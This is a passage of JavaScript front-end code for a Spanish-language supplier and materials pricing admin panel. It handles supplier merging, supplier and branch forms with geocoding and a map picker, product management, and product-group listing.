    c.innerHTML = '<p style="text-align:center;color:var(--gray-500)">Cargando preview...</p>';

    try {
        const resp = await API.mergePreview(keepId, absorbId);
        if (!resp.ok) { c.innerHTML = `<p style="color:var(--danger)">${esc(resp.detail || 'Error')}</p>`; return; }
        renderMergeComparison(resp.data);
    } catch (e) {
        c.innerHTML = `<p style="color:var(--danger)">Error: ${e.message}</p>`;
    }
}

function renderMergeComparison(data) {
    const c = document.getElementById('merge-content');
    const { keep, absorb, absorb_counts } = data;

    const fields = [
        { key: 'name', label: 'Razon Social' },
        { key: 'trade_name', label: 'Nombre Comercial' },
        { key: 'nit', label: 'NIT' },
        { key: 'email', label: 'Email' },
        { key: 'phone', label: 'Telefono' },
        { key: 'whatsapp', label: 'WhatsApp' },
        { key: 'city', label: 'Ciudad' },
        { key: 'department', label: 'Departamento' },
        { key: 'address', label: 'Direccion' },
        { key: 'website', label: 'Website' },
        { key: 'latitude', label: 'Latitud' },
        { key: 'longitude', label: 'Longitud' },
        { key: 'preferred_channel', label: 'Canal Preferido' },
    ];

    const rowsHtml = fields.map(f => {
        const kVal = keep[f.key] ?? '';
        const aVal = absorb[f.key] ?? '';
        const same = String(kVal) === String(aVal);
        const bg = same ? '' : 'background:var(--warning-bg, #fff8e1)';
        return `
            <tr style="${bg}">
                <td style="font-weight:500;font-size:13px;padding:6px 8px">${f.label}</td>
                <td style="padding:6px 8px">
                    <label style="display:flex;align-items:center;gap:4px;font-size:13px;cursor:pointer">
                        <input type="radio" name="merge_${f.key}" value="keep" ${same || kVal ? 'checked' : ''}>
                        ${esc(String(kVal)) || '<span style="color:var(--gray-300)">vacio</span>'}
                    </label>
                </td>
                <td style="padding:6px 8px">
                    <label style="display:flex;align-items:center;gap:4px;font-size:13px;cursor:pointer">
                        <input type="radio" name="merge_${f.key}" value="absorb" ${!kVal && aVal ? 'checked' : ''}>
                        ${esc(String(aVal)) || '<span style="color:var(--gray-300)">vacio</span>'}
                    </label>
                </td>
            </tr>`;
    }).join('');

    const keepCats = (keep.categories || []).join(', ') || 'ninguna';
    const absorbCats = (absorb.categories || []).join(', ') || 'ninguna';
    const totalMigrate = absorb_counts.branches + absorb_counts.quotations + absorb_counts.product_matches + absorb_counts.price_history;

    c.innerHTML = `
        <div style="margin-bottom:12px">
            <button class="btn btn-sm btn-secondary" onclick="renderMergeStep1();loadDuplicateSuggestions()" style="font-size:12px">&larr; Volver a seleccion</button>
        </div>
        <div class="table-wrap"><table style="font-size:13px;width:100%">
            <thead><tr>
                <th style="width:140px">Campo</th>
                <th style="color:var(--success)">A — ${esc(keep.name)} <span class="badge badge-success">sobrevive</span></th>
                <th style="color:var(--danger)">B — ${esc(absorb.name)} <span class="badge badge-danger">se absorbe</span></th>
            </tr></thead>
            <tbody>${rowsHtml}</tbody>
        </table></div>
        <div style="margin:12px 0;font-size:13px">
            <strong>Categorias:</strong> Se uniran automaticamente (A: ${esc(keepCats)} + B: ${esc(absorbCats)})
        </div>
        <div style="background:var(--gray-50);border-radius:8px;padding:12px;margin:12px 0">
            <strong style="font-size:14px">Registros a migrar de B a A:</strong>
            <div style="display:grid;grid-template-columns:repeat(4,1fr);gap:8px;margin-top:8px;font-size:13px">
                <div><strong>${absorb_counts.branches}</strong> sucursales</div>
                <div><strong>${absorb_counts.quotations}</strong> cotizaciones</div>
                <div><strong>${absorb_counts.product_matches}</strong> matches</div>
                <div><strong>${absorb_counts.price_history}</strong> precios</div>
            </div>
        </div>
        <div style="display:flex;gap:8px;margin-top:16px">
            <button class="btn btn-primary" onclick="executeMerge(${keep.id}, ${absorb.id})"
                    style="background:var(--danger);border-color:var(--danger)">
                ${icon('users',16)} Confirmar Fusion
            </button>
            <button class="btn btn-secondary" onclick="closeModal()">Cancelar</button>
        </div>
        <input type="hidden" id="merge-keep-id-val" value="${keep.id}">
        <input type="hidden" id="merge-absorb-id-val" value="${absorb.id}">
    `;
}

async function executeMerge(keepId, absorbId) {
    if (!confirm('ATENCION: Esta accion es irreversible. Se fusionaran todos los datos del proveedor B en A y B quedara desactivado. Continuar?')) return;

    // Collect field overrides from radio buttons
    const fields = ['name','trade_name','nit','email','phone','whatsapp','city','department','address','website','latitude','longitude','preferred_channel'];
    const field_overrides = {};
    fields.forEach(f => {
        const radio = document.querySelector(`input[name="merge_${f}"]:checked`);
        if (radio && radio.value === 'absorb') {
            field_overrides[f] = 'absorb';
        }
    });

    try {
        const resp = await API.mergeSuppliers({ keep_id: keepId, absorb_id: absorbId, field_overrides });
        if (resp.ok) {
            closeModal();
            const s = resp.data.summary;
            toast(`Fusion completada: ${s.branches_migrated} sucursales, ${s.quotations_migrated} cotizaciones, ${s.price_history_migrated} precios migrados`, 'success');
            loadAdminSuppliers();
        } else {
            toast(resp.detail || 'Error en fusion', 'error');
        }
    } catch (e) {
        toast('Error de conexion: ' + e.message, 'error');
    }
}

function showAdminSupplierForm(editId) {
    const title = editId ? 'Editar Proveedor' : 'Nuevo Proveedor (Campo)';
    const catOptions = Object.entries(CATEGORY_META).map(([k, v]) =>
        `<label style="display:flex;align-items:center;gap:4px;font-size:13px">
            <input type="checkbox" name="cat_${k}" value="${k}"> ${v.icon} ${v.label}
        </label>`
    ).join('');

    showModal(title, `
        <form id="admin-supplier-form" onsubmit="handleAdminSupplier(event, ${editId || 'null'})">
            <div class="form-group">
                <label class="form-label">Nombre / Razon Social *</label>
                <input class="form-input" name="name" required placeholder="Ferreteria El Constructor">
            </div>
            <div class="form-group">
                <label class="form-label">Nombre comercial</label>
                <input class="form-input" name="trade_name" placeholder="El Constructor">
            </div>
            <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
                <div class="form-group"><label class="form-label">NIT</label><input class="form-input" name="nit" placeholder="1234567890"></div>
                <div class="form-group"><label class="form-label">Email</label><input class="form-input" type="email" name="email" placeholder="contacto@empresa.com"></div>
            </div>
            <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
                <div class="form-group"><label class="form-label">Telefono</label><input class="form-input" name="phone" placeholder="33445566"></div>
                <div class="form-group"><label class="form-label">WhatsApp *</label><input class="form-input" name="whatsapp" required placeholder="59177889900"></div>
            </div>
            <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
                <div class="form-group"><label class="form-label">Ciudad *</label><input class="form-input" name="city" required placeholder="Santa Cruz de la Sierra"></div>
                <div class="form-group"><label class="form-label">Departamento *</label>
                    <select class="form-select" name="department" required>
                        <option value="">Seleccionar...</option>
                        ${DEPARTMENTS.map(d => `<option value="${d}">${d}</option>`).join('')}
                    </select>
                </div>
            </div>
            <div class="form-group"><label class="form-label">Direccion</label><input class="form-input" name="address" placeholder="Av. Principal #123, Zona Centro"></div>
            <div class="form-group">
                <label class="form-label">Categorias de productos *</label>
                <div style="display:grid;grid-template-columns:1fr 1fr;gap:6px;margin-top:4px">
                    ${catOptions}
                </div>
            </div>
            <div class="form-group"><label class="form-label">Canal preferido</label>
                <select class="form-select" name="preferred_channel">
                    <option value="whatsapp">WhatsApp</option>
                    <option value="email">Email</option>
                    <option value="telegram">Telegram</option>
                </select>
            </div>
            <div class="form-group">
                <label class="form-label">Ubicacion (coordenadas)</label>
                <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:8px">
                    <input class="form-input" name="latitude" type="number" step="any" placeholder="Latitud (-16.5)">
                    <input class="form-input" name="longitude" type="number" step="any" placeholder="Longitud (-68.15)">
                </div>
                <div style="display:flex;gap:6px;flex-wrap:wrap">
                    <button type="button" class="btn btn-sm btn-secondary" onclick="geocodeFromForm()">${icon('search',12)} Geocodificar desde direccion</button>
                    <button type="button" class="btn btn-sm btn-secondary" onclick="pickLocationOnMap()">${icon('map-pin',12)} Elegir en mapa</button>
                </div>
                <div id="geocode-results" style="margin-top:6px"></div>
            </div>
            ${isManager() ? `
            <div class="form-group"><label class="form-label">Estado de verificacion</label>
                <select class="form-select" name="verification_state">
                    <option value="pending">Pendiente</option>
                    <option value="verified">Verificado</option>
                    <option value="rejected">Rechazado</option>
                </select>
            </div>` : ''}
            <button type="submit" class="btn btn-primary" style="width:100%;justify-content:center;padding:10px">
                ${editId ? 'Guardar Cambios' : 'Registrar Proveedor'}
            </button>
        </form>
        ${editId ? `
        <hr style="margin:16px 0">
        <h4 style="margin-bottom:8px">Sucursales</h4>
        <div id="supplier-branches-list"><p style="color:#999;font-size:13px">Cargando sucursales...</p></div>
        <button class="btn btn-sm btn-secondary" onclick="showBranchForm(${editId})" style="margin-top:8px">+ Agregar Sucursal</button>
        ` : ''}
    `);

    // If editing, load existing data
    if (editId) {
        loadSupplierIntoForm(editId);
        loadSupplierBranches(editId);
    }
}

async function geocodeFromForm() {
    const f = document.getElementById('admin-supplier-form');
    if (!f) return;
    const parts = [f.address?.value, f.city?.value, f.department?.value].filter(Boolean);
    const q = parts.join(', ');
    if (q.length < 3) { toast('Ingresa direccion, ciudad o departamento primero', 'error'); return; }
    const box = document.getElementById('geocode-results');
    if (box) box.innerHTML = `<small style="color:#6b7280">Buscando...</small>`;
    const resp = await API.geocodeAddress(q);
    if (!resp.ok || !resp.data.length) {
        if (box) box.innerHTML = `<small style="color:#b91c1c">No se encontraron resultados para "${esc(q)}"</small>`;
        return;
    }
    if (box) {
        box.innerHTML = `
            <div style="background:#f9fafb;border:1px solid #e5e7eb;border-radius:6px;padding:6px;font-size:12px">
                <div style="color:#6b7280;margin-bottom:4px">Selecciona una coincidencia:</div>
                ${resp.data.map((r, i) => `
                    <div style="padding:6px;cursor:pointer;border-radius:4px;transition:background 0.1s" onmouseover="this.style.background='#eff6ff'" onmouseout="this.style.background=''" onclick="applyGeocode(${r.latitude},${r.longitude})">
                        <div>${esc(r.display_name)}</div>
                        <small style="color:#6b7280">${r.latitude.toFixed(5)}, ${r.longitude.toFixed(5)}</small>
                    </div>
                `).join('')}
            </div>`;
    }
}

function applyGeocode(lat, lon) {
    const f = document.getElementById('admin-supplier-form');
    if (!f) return;
    f.latitude.value = lat;
    f.longitude.value = lon;
    const box = document.getElementById('geocode-results');
    if (box) box.innerHTML = `<small style="color:#166534">&check; Ubicacion aplicada: ${lat.toFixed(5)}, ${lon.toFixed(5)}</small>`;
}

function pickLocationOnMap() {
    const f = document.getElementById('admin-supplier-form');
    if (!f) return;
    const startLat = parseFloat(f.latitude?.value) || -16.5;
    const startLon = parseFloat(f.longitude?.value) || -68.15;
    const existing = document.querySelector('.modal-overlay-picker');
    if (existing) existing.remove();
    const overlay = document.createElement('div');
    overlay.className = 'modal-overlay modal-overlay-picker';
    overlay.onclick = (e) => { if (e.target === overlay) overlay.remove(); };
    const mapId = 'pick-map-' + Date.now();
    overlay.innerHTML = `
        <div class="modal" style="max-width:700px;width:95%">
            <div class="modal-header">
                <h3>${icon('map-pin',16)} Haz clic en el mapa para elegir ubicacion</h3>
                <button class="modal-close" onclick="this.closest('.modal-overlay').remove()">&times;</button>
            </div>
            <div class="modal-body" style="padding:12px">
                <div id="${mapId}" style="height:420px;border-radius:6px"></div>
                <div id="pick-coords" style="margin-top:8px;font-size:13px;color:#6b7280">
                    Lat: ${startLat.toFixed(5)}, Lon: ${startLon.toFixed(5)}
                </div>
                <div style="display:flex;gap:8px;margin-top:8px">
                    <button class="btn btn-primary" onclick="confirmPickedLocation()">Usar esta ubicacion</button>
                    <button class="btn btn-secondary" onclick="this.closest('.modal-overlay').remove()">Cancelar</button>
                </div>
            </div>
        </div>
    `;
    document.body.appendChild(overlay);
    setTimeout(() => {
        MapUtils.createMap(mapId, [startLat, startLon], 13);
        MapUtils.clearMarkers();
        const marker = L.marker([startLat, startLon], { draggable: true }).addTo(MapUtils._map);
        _pickedLocation = { lat: startLat, lon: startLon, marker };
        const updateCoords = (lat, lon) => {
            _pickedLocation.lat = lat;
            _pickedLocation.lon = lon;
            const box = document.getElementById('pick-coords');
            if (box) box.textContent = `Lat: ${lat.toFixed(5)}, Lon: ${lon.toFixed(5)}`;
        };
        marker.on('dragend', () => {
            const p = marker.getLatLng();
            updateCoords(p.lat, p.lng);
        });
        MapUtils._map.on('click', (e) => {
            marker.setLatLng(e.latlng);
            updateCoords(e.latlng.lat, e.latlng.lng);
        });
    }, 50);
}

let _pickedLocation = null;

function confirmPickedLocation() {
    if (!_pickedLocation) return;
    const f = document.getElementById('admin-supplier-form');
    if (f) {
        f.latitude.value = _pickedLocation.lat.toFixed(6);
        f.longitude.value = _pickedLocation.lon.toFixed(6);
        const box = document.getElementById('geocode-results');
        if (box) box.innerHTML = `<small style="color:#166534">&check; Ubicacion seleccionada en mapa</small>`;
    }
    const picker = document.querySelector('.modal-overlay-picker');
    if (picker) picker.remove();
}

async function loadSupplierIntoForm(id) {
    try {
        const resp = await API.supplier(id);
        if (!resp.ok) return;
        const s = resp.data;
        const f = document.getElementById('admin-supplier-form');
        if (!f) return;
        if (s.name) f.name.value = s.name;
        if (s.trade_name) f.trade_name.value = s.trade_name;
        if (s.nit) f.nit.value = s.nit;
        if (s.email) f.email.value = s.email;
        if (s.phone) f.phone.value = s.phone;
        if (s.whatsapp) f.whatsapp.value = s.whatsapp;
        if (s.city) f.city.value = s.city;
        if (s.department) f.department.value = s.department;
        if (s.address) f.address.value = s.address;
        if (s.preferred_channel) f.preferred_channel.value = s.preferred_channel;
        if (s.latitude) f.latitude.value = s.latitude;
        if (s.longitude) f.longitude.value = s.longitude;
        if (f.verification_state && s.verification_state) f.verification_state.value = s.verification_state;
        // Check category checkboxes
        (s.categories || []).forEach(c => {
            const cb = f[`cat_${c}`];
            if (cb) cb.checked = true;
        });
    } catch {}
}

async function handleAdminSupplier(e, editId) {
    e.preventDefault();
    const f = e.target;

    // Collect checked categories
    const categories = Object.keys(CATEGORY_META).filter(k => f[`cat_${k}`]?.checked);

    const data = {
        name: f.name.value,
        trade_name: f.trade_name.value || null,
        nit: f.nit.value || null,
        email: f.email.value || null,
        phone: f.phone.value || null,
        whatsapp: f.whatsapp.value || null,
        city: f.city.value || null,
        department: f.department.value || null,
        address: f.address.value || null,
        categories: categories.length ? categories : null,
        preferred_channel: f.preferred_channel.value,
        latitude: f.latitude.value ? parseFloat(f.latitude.value) : null,
        longitude: f.longitude.value ? parseFloat(f.longitude.value) : null,
    };

    if (f.verification_state) {
        data.verification_state = f.verification_state.value;
    }

    try {
        const resp = editId
            ? await API.updateSupplier(editId, data)
            : await API.createSupplier(data);
        if (resp.ok) {
            closeModal();
            toast(editId ? 'Proveedor actualizado' : 'Proveedor registrado', 'success');
            loadAdminSuppliers();
        } else {
            toast(resp.detail || 'Error', 'error');
        }
    } catch { toast('Error de conexion', 'error'); }
}

// ── Supplier Branches ─────────────────────────────────────────
async function loadSupplierBranches(supplierId) {
    const container = document.getElementById('supplier-branches-list');
    if (!container) return;
    try {
        const resp = await API.get(`/suppliers/${supplierId}/branches`);
        if (!resp.ok || !resp.data.length) {
            container.innerHTML = '<p style="color:#999;font-size:13px">Sin sucursales registradas</p>';
            return;
        }
        container.innerHTML = `<table style="width:100%;font-size:13px;border-collapse:collapse">
            <thead><tr style="text-align:left;border-bottom:1px solid #eee">
                <th>Sucursal</th><th>Ciudad</th><th>WhatsApp</th><th>Acciones</th>
            </tr></thead>
            <tbody>${resp.data.map(b => `
                <tr style="border-bottom:1px solid #f0f0f0">
                    <td>${esc(b.branch_name)}${b.is_main ? ' <span class="badge badge-success" style="font-size:10px">Principal</span>' : ''}</td>
                    <td>${esc(b.city || '-')}</td>
                    <td>${esc(b.whatsapp || '-')}</td>
                    <td>
                        <button class="btn btn-sm btn-secondary" onclick="showBranchForm(${supplierId}, ${b.id})" style="padding:2px 6px">${icon('edit',12)}</button>
                        <button class="btn btn-sm btn-danger" onclick="deleteBranch(${supplierId}, ${b.id})" style="padding:2px 6px">${icon('x',12)}</button>
                    </td>
                </tr>
            `).join('')}</tbody>
        </table>`;
    } catch {
        container.innerHTML = '<p style="color:red;font-size:13px">Error cargando sucursales</p>';
    }
}

function showBranchForm(supplierId, branchId) {
    const title = branchId ? 'Editar Sucursal' : 'Nueva Sucursal';
    const formHtml = `
        <form id="branch-form" onsubmit="handleBranch(event, ${supplierId}, ${branchId || 'null'})">
            <div class="form-group"><label class="form-label">Nombre Sucursal *</label>
                <input class="form-input" name="branch_name" required placeholder="Sucursal Santa Cruz"></div>
            <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
                <div class="form-group"><label class="form-label">Ciudad</label><input class="form-input" name="city" placeholder="Santa Cruz"></div>
                <div class="form-group"><label class="form-label">Departamento</label>
                    <select class="form-select" name="department">
                        <option value="">Seleccionar...</option>
                        ${DEPARTMENTS.map(d => `<option value="${d}">${d}</option>`).join('')}
                    </select>
                </div>
            </div>
            <div class="form-group"><label class="form-label">Direccion</label><input class="form-input" name="address" placeholder="Av. Banzer #456"></div>
            <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
                <div class="form-group"><label class="form-label">Telefono</label><input class="form-input" name="phone"></div>
                <div class="form-group"><label class="form-label">WhatsApp</label><input class="form-input" name="whatsapp" placeholder="59177001122"></div>
            </div>
            <div class="form-group"><label class="form-label">Email</label><input class="form-input" type="email" name="email"></div>
            <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
                <div class="form-group"><label class="form-label">Latitud</label><input class="form-input" name="latitude" type="number" step="any"></div>
                <div class="form-group"><label class="form-label">Longitud</label><input class="form-input" name="longitude" type="number" step="any"></div>
            </div>
            <div class="form-group"><label style="display:flex;align-items:center;gap:6px;font-size:13px">
                <input type="checkbox" name="is_main"> Sucursal principal
            </label></div>
            <button type="submit" class="btn btn-primary" style="width:100%;justify-content:center;padding:10px">${branchId ? 'Guardar' : 'Crear Sucursal'}</button>
        </form>
    `;
    showModal(title, formHtml);
    if (branchId) loadBranchIntoForm(supplierId, branchId);
}

async function loadBranchIntoForm(supplierId, branchId) {
    try {
        const resp = await API.get(`/suppliers/${supplierId}/branches`);
        if (!resp.ok) return;
        const b = resp.data.find(x => x.id === branchId);
        if (!b) return;
        const f = document.getElementById('branch-form');
        if (!f) return;
        f.branch_name.value = b.branch_name || '';
        f.city.value = b.city || '';
        f.department.value = b.department || '';
        f.address.value = b.address || '';
        f.phone.value = b.phone || '';
        f.whatsapp.value = b.whatsapp || '';
        f.email.value = b.email || '';
        if (b.latitude) f.latitude.value = b.latitude;
        if (b.longitude) f.longitude.value = b.longitude;
        f.is_main.checked = b.is_main || false;
    } catch {}
}

async function handleBranch(e, supplierId, branchId) {
    e.preventDefault();
    const f = e.target;
    const data = {
        branch_name: f.branch_name.value,
        city: f.city.value || null,
        department: f.department.value || null,
        address: f.address.value || null,
        phone: f.phone.value || null,
        whatsapp: f.whatsapp.value || null,
        email: f.email.value || null,
        latitude: f.latitude.value ? parseFloat(f.latitude.value) : null,
        longitude: f.longitude.value ? parseFloat(f.longitude.value) : null,
        is_main: f.is_main.checked,
    };
    try {
        const resp = branchId
            ? await API.put(`/suppliers/${supplierId}/branches/${branchId}`, data)
            : await API.post(`/suppliers/${supplierId}/branches`, data);
        if (resp.ok) {
            closeModal();
            toast(branchId ? 'Sucursal actualizada' : 'Sucursal creada', 'success');
            // Reload the supplier form to show updated branches
            showAdminSupplierForm(supplierId);
        } else {
            toast(resp.detail || 'Error', 'error');
        }
    } catch { toast('Error de conexion', 'error'); }
}

async function deleteBranch(supplierId, branchId) {
    if (!confirm('Eliminar esta sucursal?')) return;
    try {
        const resp = await API.del(`/suppliers/${supplierId}/branches/${branchId}`);
        if (resp.ok) {
            toast('Sucursal eliminada', 'success');
            loadSupplierBranches(supplierId);
        } else { toast(resp.detail || 'Error', 'error'); }
    } catch { toast('Error de conexion', 'error'); }
}

// ── Admin: Products ────────────────────────────────────────────
let _admProdOffset = 0;
let _admProdCategory = '';
const _admProdPageSize = 50;

async function renderAdminProducts() {
    const c = document.getElementById('admin-content');

    // Load categories for filter
    let catOptions = '<option value="">Todas las categorias</option>';
    try {
        const catsRes = await API.adminCategories();
        if (catsRes.ok && catsRes.data) {
            catOptions += catsRes.data.map(cat =>
                `<option value="${esc(cat.key)}" ${_admProdCategory === cat.key ? 'selected' : ''}>${esc(cat.label || cat.key)}</option>`
            ).join('');
        }
    } catch {}

    c.innerHTML = `
        <div class="admin-toolbar">
            <div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap">
                <input class="form-input" id="admin-product-search" placeholder="Buscar producto/insumo..."
                       oninput="debounceAdminProducts()" style="width:250px">
                <select id="admin-product-category"
                        onchange="_admProdCategory=this.value;_admProdOffset=0;loadAdminProducts()"
                        style="padding:6px 10px;border:1px solid #ddd;border-radius:4px">
                    ${catOptions}
                </select>
            </div>
            <button class="btn btn-primary" onclick="showAdminProductForm()">
                ${icon('plus',16)} Nuevo
            </button>
        </div>
        <div id="admin-products-list"></div>
    `;
    loadAdminProducts();
}

let _admProdTimer;
function debounceAdminProducts() {
    clearTimeout(_admProdTimer);
    _admProdTimer = setTimeout(() => { _admProdOffset = 0; loadAdminProducts(); }, 300);
}

async function loadAdminProducts() {
    const q = document.getElementById('admin-product-search')?.value?.trim() || '';
    let params = `?limit=${_admProdPageSize}&offset=${_admProdOffset}`;
    if (q) params += `&q=${encodeURIComponent(q)}`;
    if (_admProdCategory) params += `&category=${encodeURIComponent(_admProdCategory)}`;

    try {
        const resp = await API.insumos(params);
        const container = document.getElementById('admin-products-list');
        if (!container) return;
        if (!resp.ok || !resp.data.length) {
            container.innerHTML = '<div class="empty-state"><p>No hay productos</p></div>';
            return;
        }
        const total = resp.total || 0;
        container.innerHTML = `
            <div class="table-wrap"><table>
                <thead><tr>
                    <th>Nombre</th><th>Codigo</th><th>UOM</th><th>Categoria</th><th>Precio Ref.</th><th>Acciones</th>
                </tr></thead>
                <tbody>${resp.data.map(p => `
                    <tr>
                        <td><strong>${esc(p.name)}</strong></td>
                        <td>${p.code ? `<span class="badge badge-gray">${esc(p.code)}</span>` : '-'}</td>
                        <td>${esc(p.uom)}</td>
                        <td>${p.category ? `<span class="badge">${esc(p.category)}</span>` : '-'}</td>
                        <td>${p.ref_price ? `${p.ref_price.toFixed(2)} ${esc(p.ref_currency)}` : '-'}</td>
                        <td style="white-space:nowrap">
                            <button class="btn btn-sm btn-secondary" onclick="showPriceHistory(${p.id}, decodeURIComponent('${encodeURIComponent(p.name)}'))" title="Ver historial de precios">${icon('trending-up',14)}</button>
                            <button class="btn btn-sm btn-secondary" onclick="showAdminProductForm(${p.id})">${icon('edit',14)}</button>
                        </td>
                    </tr>
                `).join('')}</tbody>
            </table></div>
            ${total > _admProdPageSize ? `
                <div style="display:flex;justify-content:center;gap:8px;margin-top:16px;align-items:center">
                    <button class="btn btn-sm" ${_admProdOffset === 0 ? 'disabled' : ''}
                            onclick="_admProdOffset=Math.max(0,_admProdOffset-${_admProdPageSize});loadAdminProducts()">Anterior</button>
                    <span style="padding:6px;color:#666;font-size:13px">${_admProdOffset + 1}-${Math.min(_admProdOffset + _admProdPageSize, total)} de ${total}</span>
                    <button class="btn btn-sm" ${_admProdOffset + _admProdPageSize >= total ? 'disabled' : ''}
                            onclick="_admProdOffset+=${_admProdPageSize};loadAdminProducts()">Siguiente</button>
                </div>
            ` : `<p style="margin-top:8px;font-size:13px;color:var(--gray-500)">${total} productos</p>`}
        `;
    } catch { document.getElementById('admin-products-list').innerHTML = '<div class="empty-state"><p>Error cargando</p></div>'; }
}

function showAdminProductForm(editId) {
    const title = editId ? 'Editar Producto' : 'Nuevo Producto';
    const catSuggestions = Object.values(CATEGORY_META).map(v => v.label).join(', ') || 'Ferreteria, Acero, Cemento...';

    showModal(title, `
        <form id="admin-product-form" onsubmit="handleAdminProduct(event, ${editId || 'null'})">
            <div class="form-group">
                <label class="form-label">Nombre del producto *</label>
                <input class="form-input" name="name" required placeholder="Ej: Cemento Portland IP-30">
            </div>
            <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
                <div class="form-group"><label class="form-label">Unidad de medida *</label>
                    <select class="form-select" name="uom" required>
                        ${UOM_LIST.length ? UOM_LIST.map(u => `<option value="${esc(u.key)}">${esc(u.key)} - ${esc(u.label)}</option>`).join('') :
                        `<option value="bls">bls (Bolsa)</option><option value="kg">kg</option><option value="tn">tn (Tonelada)</option>
                        <option value="m3">m3</option><option value="m2">m2</option><option value="ml">ml (Metro lineal)</option>
                        <option value="pza">pza (Pieza)</option><option value="lt">lt (Litro)</option><option value="gl">gl (Galon)</option>
                        <option value="glb">glb (Global)</option><option value="rollo">rollo</option><option value="varilla">varilla</option>`}
                    </select>
                </div>
                <div class="form-group"><label class="form-label">Codigo</label><input class="form-input" name="code" placeholder="CEM-001"></div>
            </div>
            <div class="form-group">
                <label class="form-label">Categoria</label>
                <input class="form-input" name="category" placeholder="${catSuggestions}" list="cat-suggestions">
                <datalist id="cat-suggestions">
                    ${Object.values(CATEGORY_META).map(v => `<option value="${v.label}">`).join('')}
                </datalist>
            </div>
            <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
                <div class="form-group"><label class="form-label">Precio referencial</label><input class="form-input" type="number" step="0.01" name="ref_price" placeholder="0.00"></div>
                <div class="form-group"><label class="form-label">Moneda</label>
                    <select class="form-select" name="ref_currency"><option value="BOB">BOB</option><option value="USD">USD</option></select>
                </div>
            </div>
            <div class="form-group"><label class="form-label">Descripcion</label><textarea class="form-input" name="description" placeholder="Descripcion adicional del producto..."></textarea></div>
            <div class="form-group"><label class="form-label">Link ficha tecnica / especificaciones</label><input class="form-input" name="spec_url" placeholder="https://ejemplo.com/ficha-tecnica.pdf"></div>
            <button type="submit" class="btn btn-primary" style="width:100%;justify-content:center;padding:10px">
                ${editId ? 'Guardar Cambios' : 'Crear Producto'}
            </button>
        </form>
    `);

    if (editId) loadProductIntoForm(editId);
}

async function loadProductIntoForm(id) {
    try {
        const resp = await API.insumo(id);
        if (!resp.ok) return;
        const p = resp.data;
        const f = document.getElementById('admin-product-form');
        if (!f) return;
        if (p.name) f.name.value = p.name;
        if (p.uom) f.uom.value = p.uom;
        if (p.code) f.code.value = p.code;
        if (p.category) f.category.value = p.category;
        if (p.ref_price) f.ref_price.value = p.ref_price;
        if (p.ref_currency) f.ref_currency.value = p.ref_currency;
        if (p.description) f.description.value = p.description;
        if (p.spec_url) f.spec_url.value = p.spec_url;
    } catch {}
}

async function handleAdminProduct(e, editId) {
    e.preventDefault();
    const f = e.target;
    const data = {
        name: f.name.value,
        uom: f.uom.value,
        code: f.code.value || null,
        category: f.category.value || null,
        ref_price: f.ref_price.value ? parseFloat(f.ref_price.value) : null,
        ref_currency: f.ref_currency.value,
        description: f.description.value || null,
        spec_url: f.spec_url.value || null,
    };

    try {
        const resp = editId
            ? await API.put(`/prices/${editId}`, data)
            : await API.createInsumo(data);
        if (resp.ok) {
            closeModal();
            toast(editId ? 'Producto actualizado' : 'Producto creado', 'success');
            loadAdminProducts();
        } else {
            toast(resp.detail || 'Error', 'error');
        }
    } catch { toast('Error de conexion', 'error'); }
}

// ── Admin: Groups ─────────────────────────────────────────────
let _admGrpOffset = 0;
let _admGrpCategory = '';
const _admGrpPageSize = 50;

async function renderAdminGroups() {
    const c = document.getElementById('admin-content');

    let catOptions = '<option value="">Todas las categorias</option>';
    try {
        const catsRes = await API.adminCategories();
        if (catsRes.ok && catsRes.data) {
            catOptions += catsRes.data.map(cat =>
                `<option value="${esc(cat.key)}" ${_admGrpCategory === cat.key ? 'selected' : ''}>${esc(cat.label || cat.key)}</option>`
            ).join('');
        }
    } catch {}

    c.innerHTML = `
        <div class="admin-toolbar">
            <div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap">
                <input class="form-input" id="admin-group-search" placeholder="Buscar grupo..."
                       oninput="debounceAdminGroups()" style="width:250px">
                <select id="admin-group-category"
                        onchange="_admGrpCategory=this.value;_admGrpOffset=0;loadAdminGroups()"
                        style="padding:6px 10px;border:1px solid #ddd;border-radius:4px">
                    ${catOptions}
                </select>
            </div>
            <div style="display:flex;gap:8px">
                <button class="btn btn-secondary" onclick="showGroupSuggestions()">
                    ${icon('trending-up',16)} Sugerencias
                </button>
                <button class="btn btn-primary" onclick="showGroupForm()">
                    ${icon('plus',16)} Nuevo Grupo
                </button>
            </div>
        </div>
        <div id="admin-groups-list"></div>
    `;
    loadAdminGroups();
}

let _admGrpTimer;
function debounceAdminGroups() {
    clearTimeout(_admGrpTimer);
    _admGrpTimer = setTimeout(() => { _admGrpOffset = 0; loadAdminGroups(); }, 300);
}

async function loadAdminGroups() {
    const q = document.getElementById('admin-group-search')?.value?.trim() || '';
    let params = `?limit=${_admGrpPageSize}&offset=${_admGrpOffset}`;
    if (q) params += `&q=${encodeURIComponent(q)}`;
    if (_admGrpCategory) params += `&category=${encodeURIComponent(_admGrpCategory)}`;

    try {
        const resp = await API.adminGroups(params);
        const container = document.getElementById('admin-groups-list');
        if (!container) return;
        if (!resp.ok || !resp.data.length) {
            container.innerHTML = '<div class="empty-state"><p>No hay grupos. Crea uno o usa las sugerencias automaticas.</p></div>';
            return;
        }
        const total = resp.total || 0;
        container.innerHTML = `
            <div class="table-wrap"><table>
                <thead><tr>
                    <th>Nombre</th><th>Categoria</th><th>Variante</th><th>Miembros</th><th>Rango Precio</th><th>Acciones</th>
                </tr></thead>
                <tbody>${resp.data.map(g => `
                    <tr>
                        <td><strong style="cursor:pointer;color:var(--primary)" onclick="showGroupDetail(${g.id})">${esc(g.name)}</strong></td>
                        <td>${g.category ? `<span class="badge">${esc(g.category)}</span>` : '-'}</td>
                        <td>${g.variant_label ? esc(g.variant_label) : '-'}</td>
                        <td><span class="badge badge-gray">${g.member_count}</span></td>
                        <td>${g.price_range.min != null ? `${g.price_range.min.toFixed(2)} - ${g.price_range.max.toFixed(2)}` : '-'}</td>
                        <td style="white-space:nowrap">
